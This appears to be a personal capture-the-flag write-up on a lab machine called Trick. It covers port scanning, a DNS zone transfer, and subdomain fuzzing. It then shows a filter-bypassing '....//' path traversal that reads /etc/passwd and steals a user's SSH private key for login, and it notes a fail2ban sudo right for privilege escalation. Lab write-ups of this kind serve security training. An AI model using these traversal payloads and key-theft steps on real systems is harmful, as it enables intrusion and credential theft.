IP: 10.10.11.166

## Nmap
```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
...snip...

25/tcp open  smtp    Postfix smtpd
...snip...

53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
...snip...

80/tcp open  http    nginx 1.14.2
...snip...

```

## Attack vector planning
I decided to check in order 22, 25, 53, and 80.
22 Usually requires SSH credentials. Brute forcing usually doesn't work well. 

	22 : SSH - Need Credential
	25 : SMTP  - Not my priority.  
		Checked with using nmap --script smtp* 10.10.11.166
				No luck
	53 : DNS
		dig <webpage>
		dig axfr <website.com> @<name-server>
		dig axfr <website> @<IP>
		dig +short ns <url>
		fierce -nds <domain>
		host -l <test-url> <name-server>
		nslookup 
			server <name-server>
			set type=any
			ls -d <test-url>
		dnsrecon -d <website> -t axfr
		whois <ip>
		dnscan -d <domain> -w <subdomain.txt>
		https://github.com/rbsec/dnscan

	
	80 : HTTP


### Port 53 - DNS Enumeration
``` 
with dig Command 
	dig axfr <website> @<IP>
; <<>> DiG 9.18.0-2-Debian <<>> axfr trick.htb @10.10.11.166
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 115 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Fri Oct 28 13:00:42 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)


with fierce command
	--domain 10.10.11.166
	Didn't have much information

with host -l 
	No luck
with nslookup
	server
	set type=any
dnsrecon -d trick.htb -t axfr
	Zone Transfer Failed. 
	
	
	


```

dig returns preprod-payroll.trick.htb. 
preprod might indicates the webpage is a preproduction website, which should not be facing external network. 
For now, I will keep this on the side and move on to port 80. 

### Port 80 - HTTP

Added trick.htb to /etc/hosts.

The webpage does not have much information. 

```
$ http  http://trick.htb/|xclip -selection clipboard


<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Coming Soon - Start Bootstrap Theme</title>
        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
...snip...
...snip...
...snip...

        <!-- * * Activate your form at https://startbootstrap.com/solution/contact-forms * *-->
        <!-- * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *-->
        <script src="https://cdn.startbootstrap.com/sb-forms-latest.js"></script>
    </body>
</html>

```

I entered a bogus email, scriptkiddie@lifetime.com
The following indicator shows up. 
```
Form submission successful!

To activate this form, sign up at  
[https://startbootstrap.com/solution/contact-forms](https://startbootstrap.com/solution/contact-forms)
```

***Don't launch an attack against that website. 




Signup :
![[Pasted image 20221022215820.png]]

https://packetstormsecurity.com/files/165572/SB-Admin-Cross-Site-Request-Forgery-SQL-Injection.html


No moving forward. 
Time to fuzz. The page didn't like gobuster, so used ffuf. 
```
gobuster dir -url http://trick.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt

Error: the server returns a status code that matches the provided options for non existing urls. http://rl/5eb9391f-b368-4db9-8036-b5fd17888b0c => 200 (Length: 390). To continue please exclude the status code or the length

```

ffuf returns some directories but not usuable. 
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://10.10.11.166/FUZZ| tee fuff


css                     [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 26ms][0m
js                      [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 36ms][0m
assets                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 26ms][0m

```

### preprod 

Decided to dig more preprod-payroll.trick.htb.
Fuzzed **preprod-FUZZ.trick.htb**

For whatever reason, the below syntax didn't work. 
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://preprod-FUZZ.trick.htb| tee fuff.preprod-FUZZ

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://trick.htb -H "HOST :preprod-FUZZ.trick.htb" -fs 5480
-H is the header "name: Value" Once specifiy the header value, the tool worked. Don't know why. 




After updating /etc/hosts file, the preprod-marketing.trick.htb poped up. 
http://preprod-marketing.trick.htb/index.php?page=services.html
http://preprod-marketing.trick.htb/index.php?page=about.html
http://preprod-marketing.trick.htb/index.php?page=contact.html

Time to do directory traversal. 
```
http://preprod-marketing.trick.htb/index.php?page=..//..//..//..//..//etc/passwd
Didn't work. Instead of trying harder. Decided to trying smarter with fuzzer. 



└─$ wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//FUZZ --hw 0 >> LFI.Marketing.linux_all


└─$ cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' >> files.txt
└─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' |grep -i root >> sensitive_files.txt
└─$  cat LFI.Marketing.linux_all|awk -F '"' '{print $2}' |grep -i home >> sensitive_files.txt

:%s!\~/!/home/michael/!                                                                                                                                 



└─$ cat existing_files.txt |awk -F "//" '{print $5}'  


Weird command...output
$ while read -r line; do wget http://preprod-marketing.trick.htb/index.php?page=....//....//....//..../"$line"  ; done <  ../sensitive_files.txt

update the senstive_files.txt :%s!///!//!                                                                                                                                            
....//....//....//....//home/michael/anaconda-ks.cfg




'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fssh%2Fssh_config'                                                                                          
'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fssh%2Fsshd_config'



From vim

	:%s!^!//!
	:%s!root!home/michael!                                                                                                                                 

```

Got the michael's id_rsa
```
0408  4 -rw-r--r-- 1 kali kali  1823 Oct 30 19:45 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa'
4860433  4 -rw-r--r-- 1 kali kali  1823 Oct 30 19:48 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa.1'
4860406  4 -rw-r--r-- 1 kali kali   395 Oct 30 19:45 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa.pub'
4860431  4 -rw-r--r-- 1 kali kali   395 Oct 30 19:48 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2F.ssh%2Fid_rsa.pub.1'
4860392  0 -rw-r--r-- 1 kali kali     0 Oct 30 19:45 'index.php?page=....%2F%2F....%2F%2F....%2F%2F....%2F%2Fhome%2Fmichael%2Fstable%2Fapache%2Fphp.ini'

```

Change the weird file name to id_rsa, and change the file permision to 600. Gained system access. 
```
└─$ ssh michael@10.10.11.166 -i id_rsa
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
michael@10.10.11.166's password: 

└─$ chmod 600 ./id_rsa                                                                 


```


Once logged in, I followed the usual Linux PE from my previous note. 
https://app.gitbook.com/s/-MdC6F2qPks25QX5I3wr/oscp_prep/3.-linux-pe
So generally, I check for services, weak file permission, sudo, cronjobs, suid/sgid, other files, then kernel exploit.  With sudo -l command, the user michael has authority to restart fail2ban service. 


```
michael@trick:~$ sudo -l

    (root) NOPASSWD: /etc/init.d/fail2ban restart

```

https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49






=================================================================
For whatever reason, ffuf didn't give me any result. 


ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://trick.htb/ -H "Host: preprod-marketing.trick.htb/index.php?page=FUZZ" -mc 200 

```

....//....//....// 
This website probably has some sort of filtering to block ../../../ but ....//....//....// works!


```











========================================================







![[Pasted image 20221024090825.png]]

![[Pasted image 20221024090853.png]]



![[Pasted image 20221024093742.png]]


Reason why I need to get annual subscription

```
dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.0-2-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.		604800	IN	NS	trick.htb.
trick.htb.		604800	IN	A	127.0.0.1
trick.htb.		604800	IN	AAAA	::1
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 23 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Tue Oct 25 11:49:26 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)


```
trick.htb --> dig --> preprod-payroll.trick.htb -->

preprod-payroll.trick.htb 

FUZZ-payroll.trick.htb
preprod-FUZZ.trick.htb
preprod-FUZZ.trick.htb/FUZZ.php


## Syntax issue
Wrong
```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://preprod-FUZZ.trick.htb/ -mc all -fc 404                                               
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://preprod-FUZZ.trick.htb -mc all -fc 404                               
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://preprod-FUZZ.trick.htb -mc all -fc 404 -s                            
  ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://preprod-FUZZ.trick.htb -mc all -fc 404 -s                                                                                                       
 1426  ls                                                                                                           
 1427  ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://preprod-FUZZ.trick.htb
 -mc all -fc 404 -s


```


Right
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -u http://trick.htb/ -H Host:preprod-FUZZ.trick.htb/ -mc all -fs 5480 -fc 400 

marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 25ms][0m

payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 27ms][0m

```

![[Pasted image 20221026105908.png]]


![[Pasted image 20221026111120.png]]

Required a heavy troubleshooting. For whatever reason, i was not able to connect to marketing website, even though my fuzzer worked. 
Suspecting It was route issue. 

![[Pasted image 20221026123653.png]]

https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/

https://github.com/Dr-Noob/HTB/blob/master/writeups/trick.md

https://zenn.dev/shooq/articles/5155c5d599025b

https://jarrodrizor.com/trick-write-up/

https://github.com/Dr-Noob/HTB/blob/master/writeups/trick.md

